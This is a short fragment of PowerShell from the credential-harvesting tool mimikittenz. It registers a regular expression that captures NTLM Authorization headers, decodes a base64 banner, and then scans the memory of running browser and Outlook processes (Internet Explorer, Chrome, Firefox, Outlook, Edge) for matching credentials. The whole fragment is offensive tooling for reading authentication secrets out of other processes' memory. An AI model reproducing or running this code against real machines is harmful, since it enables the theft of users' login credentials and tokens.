...
# General Domain Auth
    [mimikittenz.MemProcInspector]::AddRegex("DomainAuth","Authorization: NTLM .{1,125}")
    
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox", "outlook", "MicrosoftEdge")
